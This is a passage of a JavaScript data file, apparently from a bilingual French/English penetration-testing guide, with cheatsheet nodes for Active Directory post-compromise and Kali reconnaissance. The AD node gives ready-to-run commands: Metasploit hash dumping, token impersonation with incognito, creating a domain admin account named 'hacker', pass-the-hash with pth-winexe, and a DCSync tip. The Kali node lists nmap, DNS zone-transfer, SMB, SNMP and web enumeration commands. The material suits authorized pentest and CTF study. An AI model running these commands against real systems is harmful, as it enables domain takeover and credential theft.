    category: "exploit", icon: "🏰",
    description: "Post-compromise AD : dump hashes, impersonation de token et ajout de compte admin domain (Cheatsheet-God).",
    description_en: "AD post-compromise: hash dumping, token impersonation, and domain admin account creation (Cheatsheet-God).",
    commands: [
      { label: "Lister les domain admins", label_en: "List domain admins", cmd: "net group \"Domain Admins\" /domain" },
      { label: "Dump hashes (MSF)", label_en: "Dump hashes (MSF)", cmd: "run post/windows/gather/smart_hashdump GETSYSTEM=FALSE" },
      { label: "Énumérer utilisateurs du domaine (MSF)", label_en: "Enumerate domain users (MSF)", cmd: "use auxiliary/scanner/smb/smb_enumusers_domain\nset smbuser Administrator\nset smbpass <hash_NTLM>\nset rhosts 10.10.10.0/24\nset threads 8\nrun" },
      { label: "Impersonation de token (incognito)", label_en: "Token impersonation (incognito)", cmd: "meterpreter> load incognito\nmeterpreter> list_tokens -u\nmeterpreter> impersonate_token 'DOMAIN\\\\Administrator'\nmeterpreter> getuid\nmeterpreter> shell" },
      { label: "Ajouter compte admin domain", label_en: "Add domain admin account", cmd: "net user hacker Password123 /add /domain\nnet group \"Domain Admins\" hacker /add /domain" },
      { label: "Pass-the-Hash (pth-winexe)", label_en: "Pass-the-Hash (pth-winexe)", cmd: "pth-winexe -U DOMAIN/Administrator%<NTLM_HASH> //TARGET_IP cmd.exe" },
      { label: "BloodHound — cartographier AD", label_en: "BloodHound — map AD", cmd: "# Depuis meterpreter :\nrun post/windows/gather/run_as\n# Ou avec SharpHound.ps1 sur la cible\n# Import dans BloodHound → trouver chemin vers DA" }
    ],
    lookfor: [
      "Token d'admin disponible via incognito ?",
      "Hash NTLM de DA capturé → pass-the-hash",
      "Kerberoastable accounts ? (SPN non nuls)",
      "Chemin BloodHound vers Domain Admins ?"
    ],
    lookfor_en: [
      "Admin token available via incognito?",
      "DA NTLM hash captured → pass-the-hash",
      "Kerberoastable accounts? (non-null SPNs)",
      "BloodHound path to Domain Admins?"
    ],
    tips: [
      "Hashdump + pass-the-hash = souvent plus rapide que cracker le hash",
      "net group 'Domain Admins' /domain depuis n'importe quel shell",
      "BloodHound révèle les chemins d'escalade invisibles manuellement",
      "DCSync (mimikatz lsadump::dcsync) si droits ReplicatingChanges"
    ],
    tips_en: [
      "Hashdump + pass-the-hash = often faster than cracking the hash",
      "net group 'Domain Admins' /domain from any shell",
      "BloodHound reveals privilege escalation paths invisible to manual inspection",
      "DCSync (mimikatz lsadump::dcsync) if ReplicatingChanges rights are held"
    ],
    choices: [
      { label: "Domain Admin → dump tout le domaine", label_en: "Domain Admin → dump entire domain", next: "cheat_metasploit", icon: "🎯" },
      { label: "BloodHound pour cartographie", label_en: "BloodHound for AD mapping", next: "bloodhound", icon: "🐕" }
    ]
  },

  // ── KALI SURVIVAL ────────────────────────────────────────────────────────────
  "cheat_kali": {
    id: "cheat_kali", title: "Kali Survival — Cheatsheet", title_en: "Kali Survival — Cheatsheet",
    category: "tool", icon: "⚔️",
    description: "Énumération rapide, scans nmap, web enum et commandes de survie Kali (Cheatsheet-God).",
    description_en: "Quick enumeration, nmap scans, web enum, and Kali survival commands (Cheatsheet-God).",
    commands: [
      { label: "Set target IP variable", label_en: "Set target IP variable", cmd: "export ip=192.168.1.100" },
      { label: "Nmap — scans courants", label_en: "Nmap — common scans", cmd: "nmap -sS $ip                          # SYN stealth\nnmap -p 1-65535 -sV -sS -A -T4 $ip  # Enumeration complète\nnmap -T4 -F $ip                      # Quick scan\nnmap -sS -sU -T4 -A -v $ip          # TCP+UDP\nnmap -T4 -A -v -Pn $ip              # Sans ping" },
      { label: "Nmap — scripts utiles", label_en: "Nmap — useful scripts", cmd: "nmap --script=http-enum -p80 $ip\nnmap -sV -p 161 --script=snmp-info $ip\nnmap $ip --script smb-os-discovery.nse\nnmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip" },
      { label: "Nmap output fichier", label_en: "Nmap output to file", cmd: "nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip" },
      { label: "Discover réseau", label_en: "Network discovery", cmd: "arp-scan $ip/24\nnetdiscover -r $ip/24\nnmap -sn $ip/24" },
      { label: "DNS énumération", label_en: "DNS enumeration", cmd: "host -t ns domain.com\ndig axfr domain.com @ns1.domain.com\ndnsrecon -d domain.com -t axfr\ndnsenum domain.com" },
      { label: "Web enumération", label_en: "Web enumeration", cmd: "gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$ip\ndirb http://$ip/\nnikto -h $ip\nwfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 $ip/FUZZ" },
      { label: "SMB rapide", label_en: "Quick SMB", cmd: "enum4linux -a $ip\nnmap -sV -Pn -p 445 --script='smb*' $ip" },
      { label: "SNMP énumération", label_en: "SNMP enumeration", cmd: "snmpcheck -t $ip -c public\nsnmpwalk -c public -v1 $ip" },
      { label: "OpenVAS scan", label_en: "OpenVAS scan", cmd: "apt-get install openvas\nopenvas-setup\n# Interface: https://$ip:9392" },
      { label: "Port knock", label_en: "Port knock", cmd: "for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x $ip; done" },
      { label: "SSL/TLS test", label_en: "SSL/TLS test", cmd: "./testssl.sh -e -E -f -p $ip | aha > ssl_results.html" }
    ],
    lookfor: [
      "Ports ouverts inhabituels ?",
      "Zone DNS transferable ?",
      "Répertoires web cachés (admin, backup, .git) ?",
      "Communauté SNMP 'public' accessible ?"
    ],
    lookfor_en: [
      "Unusual open ports?",
      "DNS zone transferable?",
      "Hidden web directories (admin, backup, .git)?",
      "SNMP 'public' community accessible?"
    ],
    tips: [
      "Toujours commencer par nmap -sV -sC -p- pour ne rien manquer",
      "gobuster avec -x php,html,txt pour trouver les fichiers",
      "Nikto révèle souvent des headers ou vulns configurables",
      "enum4linux = couteau suisse SMB pour les boxes Windows"
    ],
    tips_en: [
      "Always start with nmap -sV -sC -p- to miss nothing",
      "gobuster with -x php,html,txt to discover files",
      "Nikto often reveals misconfigured headers or vulnerabilities",
      "enum4linux = Swiss army knife for SMB on Windows boxes"
    ],
    choices: [
      { label: "Port ouvert identifié → énumérer", label_en: "Open port identified → enumerate", next: "start", icon: "🎯" },
      { label: "Web détecté → tests web", label_en: "Web detected → web testing", next: "web_initial", icon: "🌐" },
      { label: "SMB détecté → SMB enum", label_en: "SMB detected → SMB enum", next: "cheat_smb", icon: "🗂️" }
    ]
  },

});

// ── Patches nœuds existants ────────────────────────────────────────────────────

NODES["shell_stabilize"].choices.push(
  { label: "Cheatsheets shells & pivoting", label_en: "Shells & pivoting cheatsheets", next: "cheat_shells", icon: "📋" }
);

NODES["start"].choices.push(
  { label: "Cheatsheets pratiques (GDB, Metasploit, Pivoting…)", label_en: "Practical cheatsheets (GDB, Metasploit, Pivoting…)", next: "cheat_metasploit", icon: "📋" }
);
